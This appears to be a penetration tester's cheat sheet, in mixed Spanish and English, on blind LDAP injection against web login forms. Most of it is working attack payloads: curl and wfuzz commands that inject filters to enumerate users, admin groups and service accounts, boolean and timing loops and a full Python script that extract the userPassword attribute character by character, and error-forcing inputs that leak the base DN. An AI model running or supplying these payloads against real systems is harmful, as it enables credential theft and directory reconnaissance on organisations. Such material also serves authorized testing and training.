---
aliases:
  - LDAP Blind
  - LDAP Boolean Extraction
  - LDAP Time-based
tags:
  - type/technique
  - vuln/ldap-injection
  - technique/exfiltration
  - asset/web-app
  - asset/directory-service
primary categories: null
secondary categories: null
tertiary categories: null
type: SubCheatSheet
linked:
  - '[[LDAP Injection]]'
---
# LDAP Injection - Information Disclosure / Blind Extraction

***

## Wildcards para Enumeración

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -d "username=*&password=any" https://target/login` | Match all entries | Filter `(uid={u})` simple. |
| `curl -d "username=a*&password=any" https://target/login` | Entries starting con `a` (prefix enum) | Char-by-char prefix. |
| `curl -d "username=*admin*&password=any" https://target/login` | Entries containing `admin` | Substring enumeration. |
| `curl -d "username=*)(objectClass=user)&password=any" https://target/login` | Solo objects de tipo user (AD) | objectClass filter inject. |
| `curl -d "username=*)(memberOf=CN=Admins,DC=target,DC=com)&password=any" https://target/login` | Lista miembros del grupo Admins | Group enumeration. |
| `curl --data-urlencode "username=*)(mail=*@target.com)&password=any" https://target/login` | Users con email del dominio | Email-based discovery. |
| `curl -d "username=*)(userPassword=*)&password=any" https://target/login` | Users con userPassword set | OpenLDAP solo (AD no expone). |
| `curl -d "username=*)(servicePrincipalName=*)&password=any" https://target/login` | Service accounts (Kerberoasting targets) | AD SPN enum. |
| `ldapsearch -H ldap://target -x -b "dc=target,dc=com" "(objectClass=*)" "*"` | Full directory dump si anonymous bind | Direct LDAP server access. |
| `ldapsearch -H ldap://target -x -b "dc=target,dc=com" "(objectClass=user)" sAMAccountName mail memberOf` | AD users con attributes específicos | Enumeration AD. |
^ldap-disclosure-wildcards

___

## Boolean-Based Char-by-Char

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -d "username=admin)(userPassword=a*)&password=x" https://target/login` | True/false oracle char inicial password | OpenLDAP con userPassword leakable. |
| `for c in {a..z} {0..9}; do curl -s -d "username=admin)(userPassword=${c}*)&password=x" https://target/login \| grep -q "Welcome" && echo "$c match"; done` | Loop char-by-char primer char | Boolean blind extraction. |
| `curl -d "username=admin)(memberOf=CN=Domain Admins*)&password=x" https://target/login` | Confirma si admin pertenece a Domain Admins | Group membership oracle. |
| `curl -d "username=admin)(supportedControl=1.2.840.*)&password=x" https://target/login` | Server feature flags via OID | Server fingerprinting blind. |
| `wfuzz -d "username=admin)(userPassword=FUZZ*)&password=x" -w chars.txt --hh 1234 https://target/login` | Bulk char enum con wfuzz | Filter response by length. |
| `python3 ldap-blind.py --url https://target/login --user admin --attr userPassword` (custom script) | Auto extraction script | Pattern reusable. |
^ldap-disclosure-boolean

### Script Python boolean extraction

```python
import requests, string

URL = "https://target/login"
ATTR = "userPassword"
chars = string.ascii_lowercase + string.digits + "-_!@#"

result = ""
while True:
    found = False
    for c in chars:
        payload = f"admin)({ATTR}={result}{c}*"
        r = requests.post(URL, data={"username": payload, "password": "x"})
        if "Welcome" in r.text:  # success indicator (ajustar según app)
            result += c
            print(f"[+] {result}")
            found = True
            break
    if not found:
        break

print(f"Final: {result}")
```

___

## Time-Based Oracle

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `time curl -s -d "username=admin)(\|(cn=a)(cn=b)(cn=c)...(cn=z))&password=x" https://target/login` | Heavy filter → mide latencia | Server lento bajo load. |
| `time curl -s -d "username=*)(uid=*)(\|(cn=a)(cn=b)(cn=c)...)&password=x" https://target/login` | Comparar timing match vs no-match | Timing oracle. |
| `python3 -c "import requests,time; t=time.time(); r=requests.post('https://target/login', data={'username':'admin)(userPassword=a*)','password':'x'}); print(time.time()-t)"` | Mide tiempo respuesta single char | Stat analysis per-char. |
| `for c in {a..z}; do T=$(curl -o /dev/null -s -w '%{time_total}' -d "username=admin)(userPassword=${c}*)&password=x" https://target/login); echo "$c: $T"; done` | Loop timing extraction | Bash one-liner blind extraction. |
| `wfuzz --slice "FUZZ ~ <0.5 OR > 1.0" -d "username=admin)(userPassword=FUZZ*)&password=x" -w chars.txt https://target/login` | Filter por timing | wfuzz time-based. |
^ldap-disclosure-time

___

## Error-Based Leak

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -d "username=*)(invalid&password=x" https://target/login` | Force LDAP syntax error | Stack trace o error verbose revela info. |
| `curl -d "username=NOT_A_NUMBER&password=x" https://target/login` | Type mismatch error | Field con int constraint. |
| `curl -d "username=cn=fake,DC=invalid&password=x" https://target/login` | DN parse error revela base DN del server | Malformed DN trigger. |
| `curl -d "username=admin&password=" https://target/login` y comparar con `curl -d "username=fakeuser&password="` | "User not found" vs "Wrong password" → username enumeration | Verbose error differential. |
| `curl -d "username=admin)(unknownAttr=test)&password=x" https://target/login` | Schema violation error revela attrs válidas | Schema enumeration. |
| `curl -s -d "username=*&password=x" https://target/login \| grep -oE "DC=[a-zA-Z=,]+\|CN=[^,]+\|[a-zA-Z]+Exception"` | Extraer base DN + class names del error | Post-error parsing. |
^ldap-disclosure-error

### Common error patterns

```
LDAPException: [LDAP: error code 32 - 0000208D: NameErr: DSID-031001E5,
problem 2001 (NO_OBJECT), data 0, best match of:
  'DC=target,DC=com'
]
                                                              ↑
                                                       Reveals base DN

javax.naming.directory.InvalidSearchFilterException: 
Bad search filter at character: 12: (&(uid=*)(uid=*)
                                                ↑
                                              Reveals filter
```

***
